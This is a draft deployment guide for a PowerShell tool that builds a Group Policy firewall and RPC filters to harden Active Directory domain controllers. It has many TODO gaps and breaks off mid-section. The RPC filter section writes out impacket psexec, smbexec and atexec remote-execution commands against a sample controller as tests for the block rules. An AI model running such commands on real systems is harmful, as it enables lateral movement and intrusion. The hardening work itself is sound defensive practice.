---
subtitle: ​​Deployment Documentation​
author:
  - Pavel Formanek
  - Michael Grafnetter
lang: en
keywords:
  - Active Directory
  - Firewall
  - Domain Controller
  - PowerShell
  - Group Policy
  - Security
  - RPC
header-right: "\\hspace{1cm}"
footer-left: "\\hspace{1cm}"
footer-center: "Page \\thepage"
footer-right: "\\hspace{1cm}"
---

# Domain Controller Firewall

## Change History {.unnumbered}

| Date       | Version | Author        | Description     |
|------------|--------:|---------------|-----------------|
| 2024-03-15 | 0.1     | P. Formanek   | Initial version |
| 2024-03-22 | 0.2     | M. Grafnetter | Firewall rules  |
|            |         |               |                 |

## Glossary {.unnumbered}

| Abbreviation | Explanation                                           |
|--------------|-------------------------------------------------------|
| DC           | Domain Controller                                     |
| ADDS         | Active Directory Domain Services                      |
| DNS          | Domain Name System                                    |
| GPO          | Group Policy Object                                   |
| PS           | PowerShell                                            |
| T0 / Tier 0  | Control plane of your environment – see [Admin Model] |
| SCOM         | [System Center Operations Manager]                    |
| NLA          | [Network Location Awareness]                          |
| PAW          | [Privileged Access Workstation]                       |
| FW           | Firewall                                              |
| WINS         |                                                       |
| ASR          |                                                       |
| WMI          |                                                       |
| RPC          |                                                       |
| DCOM         |                                                       |
| SMB          |                                                       |
| TCP          |                                                       |
| UDP          |                                                       |
| NTP          |                                                       |
| SNMP         |                                                       |
| RSAT         |                                                       |
| ICMP         |                                                       |
| DHCP         |                                                       |
| LLMNR        |                                                       |
| mDNS         |                                                       |

[Admin Model]: https://petri.com/use-microsofts-active-directory-tier-administrative-model/
[System Center Operations Manager]: https://learn.microsoft.com/en-us/system-center/scom/get-started
[Network Location Awareness]: https://learn.microsoft.com/en-us/windows/win32/winsock/network-location-awareness-service-provider-nla--2
[Privileged Access Workstation]: https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-devices

## Summary

The goal of this tool is to simplify deployment of specific set of firewall rules and filters that can significantly decrease the Domain Controller attack surface without compromising impacting the Active Directory functionality.
  
The tool provides a flexible and repeatable way to deploy secure configuration in your environment within minutes.  

![Windows Firewall with Advanced Security](../Screenshots/windows-firewall.png)

[![MIT License](https://img.shields.io/badge/License-MIT-green.png)](https://github.com/MichaelGrafnetter/active-directory-firewall/blob/main/LICENSE)

## Design

### Key Design Decisions

- Tested specifically on Windows Server 2022 and Windows 11 but should work on all current supported versions of Windows Server and Windows clients.
- The firewall rules design assumes you can define the following groups of IP addresses or network ranges:
  - Client network (servers and client computers)
  - Management network (endpoints used for Tier 0 administration)
  - Domain Controller network (all DCs in your forest)
- The rules are designed for Domain Controllers only, not for servers or client machines.
- The rules are designed for a DC configured with a static IP.
- The rules are designed for IPv4 only, no IPv6 support.
- The rules are designed for a DC running the recommended set of roles, i.e. ADDS, DNS and Time server, no other roles have been tested.
- The rules are not configured for SCOM, Backup agents, Log agents (except WEF push configuration) or any other custom agents running on a DC.
- The configuration focuses only on Firewall rules, no IPSec rules, no DC hardening settings, except disabling several multicast services like LLMNR or mDNS.
- The configuration enforces GPO firewall rules only – no rules merging, i.e. anything configured locally on any DC will be ignored and not applied during firewall rule evaluation.
- Only Inbound rules are configured and enforced.
- All rules are configured for all 3 profiles (Domain, Private and Public), to avoid DC unavailability in case of incorrect network type detection by NLA.
- Many of the services, which normally use dynamic ports, are configured with static port by the tool, to allow easier tracing and troubleshooting on the network level and to simplify rule configuration for network firewalls.

### Firewall Rule Deduplication

TODO: Explain Dedup/consolidation

![Duplicate RPC Endpoint Mapper rules](../Screenshots/duplicate-epmap-rules.png)

![Duplicate SMB rules](../Screenshots/duplicate-epmap-rules.png)

### Issues with Predefined Address Sets

Configuration of remote or local IP address in a rule contains predefined sets of computers.

![Predefined address sets in Windows Firwall](../Screenshots/firewall-predefined-sets.png)

There's no Microsoft documentation explaining how the keywords are defined, the only documentation briefly mentioning the keywords is [MS-FASP: Firewall and Advanced Security Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fasp/d69ec3fe-8507-4524-bdcc-813cbb3bf85f)

- Internet
- Intranet
    - this keyword source for "Intranet" IP ranges is subnets definition in Sites and Services, all subnets defined there are considered "Intranet" for the sake of firewall rules.
    - repeatedly during testing, firewall "Intranet" keyword definition haven't been updated after new subnet has been added or subnet has been deleted, not even after multiple server restarts.
    - this unreliability is the reason why we haven't used it in the definitions.
    ![Subnets - source for Intranet keyword](../Screenshots/firewall-keyword-Intranet.png)
- DNS Servers
    - this keyword is functional and respects all DNS servers defined in the properties of a network adapter. If new DNS server is defined it will be honored by the keyword only after change of network adapter state (disable / enable, server restart, etc.)
    ![Network adapter DNS configuration](../Screenshots/firewall-keyword-DNS.png)

### Avoiding Localized Rule Names

TODO
Depends on RSAT, not localized to all languages

![Localized rule names not displayed correctly](../Screenshots/localization-issue.png)

### Dealing with GPO Tattooing

TODO

### System Reboots

TODO: Need to be done manually when static ports or startup scripts are changed.

### Identifying Management Traffic

Easy: RDP, WinRM (PowerShell Remoting), ADWS,...
Problems: MS-DRSR, LDAP, SMB, DCOM, Remote Registry

### Security Standards Compliance

- [DoD: Windows Firewall with Advanced Security Security Technical Implementation Guide (STIG)](https://www.stigviewer.com/stig/windows_firewall_with_advanced_security/)
- [CIS: Microsoft Windows Server 2022 v2.0.0 L1 DC](https://www.tenable.com/audits/CIS_Microsoft_Windows_Server_2022_Benchmark_v2.0.0_L1_DC)
- [Microsoft: Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319)

### Distribution Contents

TODO: File list

## Prerequisites

- Domain administrator role or adequate role, allowing for creation of a GPO, creation of folders and files in SYSVOL and linking the GPO to Domain Controllers OU.
- PowerShell version 5.1 ![](https://img.shields.io/badge/PowerShell-5+-0000FF.png?logo=PowerShell)
- PowerShell modules (RSAT)
  - [GroupPolicy](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps)
  - [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- Supported OS: ![](https://img.shields.io/badge/Windows%20Server-2016%20|%202019%20|%202022%20|%202025-007bb8.png?logo=Windows%2011) / Windows 10

## Group Policy Object Contents

### Firewall Configuration

### Inbound Firewall Rules

### Registry Settings

Managed/Unmanaged

### Administrative Templates

ADMX/ADML, copied to Central Store if exists

### Startup Script

#### Settings Without GPO Support

##### Firewall Log File

![Firewall log file configuration](../Screenshots/firewall-log-config.png)

Log file not created by GPO, ACLs need to be configured.

```bat
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
```

#### Sample Startup Script

Automatically generated based on the config

FirewallConfiguration.bat

Example:

```shell
@ECHO OFF
REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.

echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
winmgmt.exe /standalonehost 6

echo Install the dfsrdiag.exe tool if absent.
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)

echo Set static RPC port for DFS Replication.
dfsrdiag.exe StaticRPC /Port:5722

echo Create the firewall log file and configure its DACL.
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"

echo Register the RPC filters.
netsh.exe -f "\\contoso.com\SysVol\contoso.com\Policies\{37CB7204-5767-4AA7-8E85-D29FEBDFF6D6}\Machine\Scripts\Startup\RpcNamedPipesFilters.txt"
```

## Configuration

### Configuration File

All settings that are configurable are stored in `Set-ADDSFirewallPolicy.json`, it is essential to review them and change as necessary for your environment. Improper configuration can cause network outages in your environment!

Note, that “Default value” in the configuration items below, refers to default value, that is set in the `Set-ADDSFirewallPolicy.json`, not Windows system defaults.

```json
{
  "$schema": "Set-ADDSFirewallPolicy.schema.json",
  "GroupPolicyObjectName": "Domain Controller Firewall",
  "GroupPolicyObjectComment": "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.",
  "LogDroppedPackets": true,
  "LogFilePath": "%systemroot%\\system32\\logfiles\\firewall\\pfirewall.log",
  "LogMaxSizeKilobytes": 128,
  "ClientAddresses": [ "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "10.220.6.0/24" ],
  "ManagementAddresses": [ "10.220.3.0/24" ],
  "DomainControllerAddresses": [ "10.220.1.0/24" ],
  "NtdsStaticPort": 38901,
  "NetlogonStaticPort": 38902,
  "FrsStaticPort": 38903,
  "DfsrStaticPort": 5722,
  "WmiStaticPort": true,
  "DisableNetbiosBroadcasts": true,
  "DisableLLMNR": true,
  "DisableMDNS": true,
  "EnableServiceManagement": true,
  "EnableEventLogManagement": true,
  "EnableScheduledTaskManagement": true,
  "EnableWindowsRemoteManagement": true,
  "EnablePerformanceLogAccess": true,
  "EnableOpenSSHServer": false,
  "EnableRemoteDesktop": true,
  "EnableDiskManagement": true,
  "EnableBackupManagement": true,
  "EnableFirewallManagement": false,
  "EnableComPlusManagement": false,
  "EnableLegacyFileReplication": false,
  "EnableNetbiosNameService": false,
  "EnableNetbiosDatagramService": false,
  "EnableNetbiosSessionService": false,
  "EnableWINS": false,
  "EnableNetworkProtection": true,
  "BlockWmiCommandExecution": true,
  "EnableRpcFilters": true
}
```

TODO: Intellisense support:

![Visual Studio Code support](../Screenshots/settings-intellisense.png)

The remainder of this chapter contains documentation to all the available settings.

### GroupPolicyObjectName

The name of the Group Policy Object (GPO) that will be created or updated. Feel free to change it so that it complies with your naming policy.

```yaml
Type: String
Required: true
Default value: Domain Controller Firewall
```

### GroupPolicyObjectComment

The comment text that will be visible on the GPO object.  

```yaml
Type: String
Required: false
Default value: "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script."
```

### LogDroppedPackets

Indicates whether the packets dropped by the firewall should be logged.

If true, all dropped packets will be logged into the [firewall text log](#logfilepath). If false, no packets are logged.  

```yaml
Type: Boolean
Required: false
Default value: false
Recommended value: true
Possible values: true / false
```

### LogFilePath

Specifies the path to the log file that will be used to store information about the dropped packets, if [logging is enabled](#logdroppedpackets).

[Startup script](#startup-script)

```shell
echo Create the firewall log file and configure its DACL.
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
```

```yaml
Type: String
Required: false
Default value: %systemroot%\\system32\\logfiles\\firewall\\pfirewall.log
```

### LogMaxSizeKilobytes

Sets the maximum size of the [firewall log](#logfilepath) in kilobytes (KB). The file won't grow beyond this size; when the limit is reached, old log entries are deleted to make room for the newly created ones.

```yaml
Type: Integer
Required: false
Default value: 128
Recommended value: 32767
Possible values: 1 - 32767
```

### ClientAddresses

List of client IP adresses from which inbound traffic should be allowed.

Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10". Supports also "Any" as an input.

Specify IPv4 address, IPv4 subnet or address range of all your clients. Anything what acts as a client from a DC perspective is considered client here, so you should specify all your server and user/client subnets.  
Everything that needs to interact with your DCs should be included here, except other DCs and secure endpoints (PAWs) used to manage Domain Controllers or Tier 0.

**This is a critical configuration setting!** With improper configuration, this could cause network outage for your clients.

```yaml
Type: String[]
Required: false
Default value: [ "Any" ]
```

### ManagementAddresses

List of IP addresses from which inbound management traffic should be allowed.

Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".

Specify IPv4 address, IPv4 subnet or address range of all secure endpoints (PAWs) used to manage Domain Controllers or Tier 0.  

**This is a critical configuration setting!** With improper configuration, this could cause network outage for your management workstations.

```yaml
Type: String[]
Required: false
Default value: [ "Any" ]
```

### DomainControllerAddresses

List of domain controller IP addresses, between which replication and management traffic will be allowed.

Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma, e.g. "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".

Specify IPv4 address, IPv4 subnet or address range of all your Domain Controllers in the forest.

**This is a critical configuration setting!** With improper configuration, this could cause network outage for your DCs.

```yaml
Type: String[]
Required: false
Default value: [ "Any" ]
```

### NtdsStaticPort

Static port to be used for inbound Active Directory RPC traffic.

By default, the RPC is using dynamic ports 49152 – 65535. If null, this setting is not managed through GPO. If value is defined, this value will be set as static port for Active Directory RPC traffic. See the [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port) article for more information.
If set to 0 (zero), the port is set to dynamic.
If this is configured, you also need to configure the `NetlogonStaticPort` value.

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters  
> Registry value: TCP/IP Port  
> Value type: REG_DWORD  
> Value data: (available port)

Restart the computer for the new setting to become effective.

```yaml
Type: Integer
Default value: null
Recommended value: 38901
Possible values: null / 0 / 1024 - 49151
```

### NetlogonStaticPort

Description: By default, the RPC is using dynamic ports 49152 – 65535. If null, this setting is not managed through GPO. If value is defined, this value will be set as static port for Active Directory RPC traffic. See the [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port) article for more information.
If set to 0 (zero), the port is set to dynamic.
If this is configured, you also need to configure `NtdsStaticPort` value.

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters  
> Registry value: DCTcpipPort  
> Value type: REG_DWORD  
> Value data: (available port)

Restart the Netlogon service for the new setting to become effective.

```yaml
Type: Integer
Default value: null
Recommended value: 38902
Possible values: null / 0 / 1024 - 49151
```

### FrsStaticPort

Static port to be used for legacy FRS traffic.

By default, the FSR is using dynamic RPC ports. If null, this setting is not managed through GPO. If value is defined, this value will be set as static port for DFS Replication traffic.
If set to 0 (zero), the port is set to dynamic.

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\NTFRS\\Parameters  
> Registry value: RPC TCP/IP Port Assignment  
> Value type: REG_DWORD  
> Value data: (available port)

Restart the File Replication service for the new setting to become effective.

```yaml
Type: Integer
Default value: null
Recommended value: 38903
Possible values: null / 0 / 1024 - 49151
```

### DfsrStaticPort

Static port to be used for DFSR traffic.

By default, the DFSR is using dynamic ports 49152 – 65535. If null, this setting is not managed through GPO. If value is defined, this value will be set as static port for DFS Replication traffic, for more info, see the [Configuring DFSR to a Static Port - The rest of the story](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/configuring-dfsr-to-a-static-port-the-rest-of-the-story/ba-p/396746) article.
If set to 0 (zero), the port is set to dynamic.

[Startup script](#startup-script)

1024 - 49151:

```shell
echo Install the dfsrdiag.exe tool if absent.
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)

echo Set static RPC port for DFS Replication.
dfsrdiag.exe StaticRPC /Port:5722
```

0:

```shell
echo Install the dfsrdiag.exe tool if absent.
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)

echo Set dynamic RPC port for DFS Replication.
dfsrdiag.exe StaticRPC /Port:0
```

null: not present

```yaml
Type: Integer
Default value: null
Recommended value: 5722
Possible values: null / 0 / 1024 - 49151
```

### WmiStaticPort

Indicates whether inbound Windows Management Instrumentation (WMI) traffic should use a static port.

By default, the WMI is using dynamic ports 49152 – 65535. If null, this setting is not managed through GPO. If true, WMI will use static port 24158, if false, WMI will use dynamic port. For more info, see the [Setting Up a Fixed Port for WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/setting-up-a-fixed-port-for-wmi) article.

[Startup script](#startup-script)

true:

The [RPC_C_AUTHN_LEVEL_PKT_PRIVACY](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/425a7c53-c33a-4868-8e5b-2a850d40dc73) setting prevents replay attacks, verifies that none of the data transferred between the client and server has been modified and ensures that the data transferred can only be seen unencrypted by the client and the server.

```shell
echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
winmgmt.exe /standalonehost 6
```

false:

```shell
echo Move the WMI service into the shared Svchost process.
winmgmt.exe /sharedhost
```

null: not present

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

### DisableNetbiosBroadcasts

Indicates whether the NetBIOS protocol should be switched to P-node (point-to-point) mode.

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

### DisableLLMNR

Indicates whether the Link-Local Multicast Name Resolution (LLMNR) client should be disabled.

If true, Link Local Multicast Name Resolution (LLMNR) is disabled. If false, LLMNR is enabled. For more info, please refer to the *AZ-WIN-00145* configuration item in the [Windows security baseline](https://learn.microsoft.com/en-us/azure/governance/policy/samples/guest-configuration-baseline-windows).

```yaml
Type: Boolean
Required: false
Default value: false
Recommended value: true
Possible values: true / false
```

### DisableMDNS

Indicates whether the Multicast DNS (mDNS) client should be disabled.

If null, this setting is not managed through GPO. If true, mDNS is disabled. If false, mDNS is enabled. For more info, see the following [Microsoft article](https://techcommunity.microsoft.com/t5/networking-blog/mdns-in-the-enterprise/ba-p/3275777).

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

### EnableServiceManagement

Indicates whether remote service management should be enabled.

If `true`, corresponding ports are open and remote services management will be available. If `false`, services cannot be managed remotely.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableEventLogManagement

Indicates whether remote event log management should be enabled. If `true`, the corresponding port is open and remote Event Log management will be available. If `false`, Event Log cannot be managed remotely.  The script achieves this by enabling or disabling the [Remote Event Log Management (RPC)](#remote-event-log-management-rpc) firewall rule.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: true
Possible values: true / false
```

### EnableScheduledTaskManagement

Indicates whether remote scheduled task management should be enabled.

If true, corresponding ports are open and remote scheduled tasks management will be available. If false, scheduled tasks cannot be managed remotely.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableWindowsRemoteManagement

Indicates whether inbound Windows Remote Management (WinRM) traffic should be enabled. This protocol is used by PowerShell Remoting, Server Manager, and [PowerShell CIM cmdlets](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/?view=powershell-7.4).

If true, corresponding ports are open and WinRM will be available. If false, WinRM ports won’t be open. For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows/win32/winrm/about-windows-remote-management).

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: true
Possible values: true / false
```

### EnablePerformanceLogAccess

Indicates whether remote performance log access should be enabled.

If true, corresponding ports are open and remote Performance Log management will be available. If false, Performance Log cannot be managed remotely.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableOpenSSHServer

Indicates whether inbound OpenSSH traffic should be enabled.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableRemoteDesktop

Indicates whether inbound Remote Desktop Protocol (RDP) traffic should be enabled.

If true, corresponding ports are open and remote desktop connection (RDP) will be available. If false, RDP is not available.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: true
Possible values: true / false
```

### EnableDiskManagement

Indicates whether remote disk management should be enabled.

If true, corresponding ports are open and remote disk management will be available. If false, disks cannot be managed remotely.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableBackupManagement

Indicates whether remote management of Windows Server Backup should be enabled.

If true, corresponding ports are open and remote Windows Backup management will be available. If false, Windows Backup cannot be managed remotely.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableFirewallManagement

Indicates whether remote firewall management should be enabled.

If true, corresponding ports are open and remote Windows Defender Firewall management will be available. If false, Windows Defender Firewall cannot be managed remotely.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableComPlusManagement

Indicates whether inbound COM+ management traffic should be enabled.

If true, corresponding ports are open and remote DCOM traffic for COM+ System Application management is allowed. If false, COM+ System Application cannot be managed remotely. For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows/win32/cossdk/com--application-overview).

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableLegacyFileReplication

Indicates whether inbound legacy file replication traffic should be enabled.

If true, corresponding ports are open for NTFRS replication. If you still haven’t migrated your SYSVOL replication to modern DFSR, you need to enable this setting. If false, NTFRS ports won’t be open. For more info, see the following [Microsoft article](https://learn.microsoft.com/en-us/windows-server/storage/dfs-replication/migrate-sysvol-to-dfsr).

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableNetbiosNameService

Indicates whether inbound NetBIOS Name Service should be allowed.

If true, corresponding ports (UDP 137) are open and NetBIOS will be available. If false, NetBIOS ports are not open.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableNetbiosDatagramService

Indicates whether inbound NetBIOS Datagram Service traffic should be allowed.

If true, corresponding ports (UDP 138) are open and NetBIOS will be available. If false, NetBIOS ports are not open.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableNetbiosSessionService

Indicates whether inbound NetBIOS Session Service (NBSS) traffic should be allowed.

If true, corresponding ports (TCP 139) are open and NetBIOS will be available. If false, NetBIOS ports are not open.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableWINS

If true, corresponding ports are open and Windows Internet Naming Service (WINS) will be available. If false, WINS ports are not open.  

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

### EnableNetworkProtection

Indicates whether the [Network protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/network-protection?view=o365-worldwide#overview-of-network-protection) feature of Microsoft Defender Antivirus should be enabled.

true - Block
false - Audit
null - Not configured

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

### BlockWmiCommandExecution

Indicates whether to block process creations originating from PSExec and WMI commands using Defender ASR. This is achieved by enforcing the following Microsoft Defender Antivirus Attack Surface Reduction (ASR) rules:

- [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
- [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-persistence-through-wmi-event-subscription)

true - Block (Enable the attack surface reduction rule)
false - Audit (Evaluate how the attack surface reduction rule would impact your organization if enabled)
null - Not configured / Disable (Disable the attack surface reduction rule)

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

### EnableRpcFilters

Indicates whether additional [filtering of RPC over Named Pipes](#rpc-filters) should be applied.

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

## Deployment

If you are finished with modifying all required configuration settings in the `Set-ADDSFirewallPolicy.json` file, it is recommended to review the set of rules that will be deployed by the GPO.  

Curated list of firewall rules is available at GitHub: **TODO**

Once done, you can begin deployment.

Open Powershell and run the `Set-ADDSFirewallPolicy.ps1` script:

![Executing the PowerShell script](../Screenshots/deploy-install-script.png)

You might need to adjust your Powershell execution policy to allow execution of the script:

![Changing the Script Execution Policy](../Screenshots/deploy-ps-exec-policy.png)

Script logic:

Creates GPO – the GPO is NOT linked to any OU.

Atomic changes…

Creates startup script `FirewallConfiguration.bat` (batch file is used to avoid any issues with Powershell execution policy)

![Autogenerated Group Policy startup script](../Screenshots/deploy-gpo-startup-script.png)

If the script has finished without any errors, all required objects should be deployed.

The last step is to link the newly created GPO to Domain Controllers OU.

Before doing that, you should **thoroughly review** the GPO!  

Once done, link the GPO to Domain Controllers OU.

![Group Policy link](../Screenshots/deploy-gpo-link.png)

By default, GPO is refreshed every 5 minutes for DCs, so all your DCs should have the firewall configuration applied within maximum of 5 minutes.

## Troubleshooting

`Show-WindowsFirewallLog.ps1`

```powershell
<#
.SYNOPSIS
Parses Windows Firewall log file.

.PARAMETER LogFilePath
Path to the log file.

.PARAMETER Live
Indicates that the log file should be monitored for new entries.

.NOTES
Author:  Michael Grafnetter
Version: 1.2

#>

#Requires -Version 3
#Requires -RunAsAdministrator

Param(
    [Parameter(Mandatory = $false, Position = 0)]
    [ValidateNotNullOrEmpty()]
    [string] $LogFilePath = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log",

    [Parameter()]
    [switch] $Live
)

[string[]] $columnsToShow = @('date','time','path','action','pid',
    'src-ip','src-port','dst-ip','dst-port','icmptype','icmpcode')

Get-Content -Path $LogFilePath -Wait:($Live.IsPresent) |
    Select-Object -Skip 3 |
    ForEach-Object { $PSItem -replace '^#Fields: ' } |
    ConvertFrom-Csv -Delimiter ' ' |
    Select-Object -Property $columnsToShow |
    Out-GridView -Title 'Windows Firewall Log' -Wait
```

![Parsing firewall log files](../Screenshots/firewall-log-parser.png)

## Rollback

If you need to rollback the changes, unlink the GPO from Domain Controllers OU and either wait 5 minutes or do gpupdate /force on the DCs. This should remove the firewall configuration.
If you've configured static ports for WMI and/or DFSR, you'll need to the following commands, in order to revert them back to dynamic ports.

For DFSR:
```shell
dfsrdiag staticrpc /port:0
```

For WMI
```shell
winmgmt /sharedhost
```

> [!IMPORTANT]
> TODO: zbytek static portu

## Infeasibility of Outbound Traffic Filtering

### Reasons for Blocking Outbound Traffic

NTLM relay to workstations, lateral movement, C2 channel to the Internet

### Services with User Impersonation

- Windows Update (wuauserv)
- Cryptographic Services (CryptSvc)
- Microsoft Account Sign-in Assistant (wlidsvc)
- Background Intelligent Transfer Service (BITS)

### Dynamic Keywords

https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/dynamic-keywords

### Scheduled Tasks with Custom Handlers

taskhostw.exe

![Scheduled task with a custom handler](../Screenshots/scheduled-task-custom-handler.png)

### Microsoft Defender for Identity

Defender for Identity sensor to All devices on network  - SMB (TCP/UDP 445), RPC (TCP 135), NetBIOS (UDP 137), RDP (TCP 3389).

### Azure Arc

PowerShell, msiexec

![Azure Arc binaries](../Screenshots/azure-arc-binaries.png)

Any process

![Azure Arc built-in firewall rule](../Screenshots/azure-arc-firewall.png)

### Installers Downloading Additional Files

### WinHTTP Proxy

![Listing the advanced WinHTTP proxy configuration](../Screenshots/proxy-config.png)

![WinHTTP proxy configuration error](../Screenshots/proxy-error.png)

## Static RPC Ports

TODO

- [How to restrict Active Directory RPC traffic to a specific port](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/restrict-ad-rpc-traffic-to-specific-port)
- [Configuring DFSR to a Static Port - The rest of the story](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/configuring-dfsr-to-a-static-port-the-rest-of-the-story/ba-p/396746)
- [Setting Up a Fixed Port for WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/setting-up-a-fixed-port-for-wmi)

## RPC Filters

### RPC over Named Pipes

TODO

### \[MS-SCMR\]: Service Control Manager Remote Protocol

```shell
sc.exe \\contoso-dc query wuauserv
```

```shell
impacket-psexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
```

```shell
impacket-smbexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
```

Named pipe: [\\PIPE\\svcctl](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333) , Protocol UUID [367ABB81-9844-35F1-AD32-98F038001003](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/e7a38186-cde2-40ad-90c7-650822bd6333)

```txt
# Block [MS-SCMR]: Service Control Manager Remote Protocol, Named pipe: \PIPE\svcctl
# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
add rule layer=um actiontype=block filterkey=d0c7640c-9355-4e52-8335-c12835559c10
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=367ABB81-9844-35F1-AD32-98F038001003
add filter
```

### \[MS-TSCH\]: Task Scheduler Service Remoting Protocol

```shell
schtasks.exe /query /s contoso-dc
```

```shell
impacket-atexec 'contoso/Admin:Pa$$w0rd@contoso-dc' hostname
```

Named pipe: [\\PIPE\\atsvc](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)

Interface UUID: [86D35949-83C9-4044-B424-DB363231FD0C](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)

```txt
# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Windows Vista Task Remote Protocol (ITaskSchedulerService)
# This rule only blocks RPC over Named Pipes, while RPC over TCP is still allowed.
add rule layer=um actiontype=block filterkey=a43b9dd2-0866-4476-89dc-2e9b200762af
add condition field=protocol matchtype=equal data=ncacn_np
add condition field=if_uuid matchtype=equal data=86D35949-83C9-4044-B424-DB363231FD0C
add filter
```
Interface UUID: [1FF70682-0A51-30E8-076D-740BE8CEE98B](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/fbab083e-f79f-4216-af4c-d5104a913d40)


```txt
# Block [MS-TSCH]: Task Scheduler Service Remoting Protocol, Named pipe: \PIPE\atsvc, Interface: Task Scheduler Agent (ATSvc)
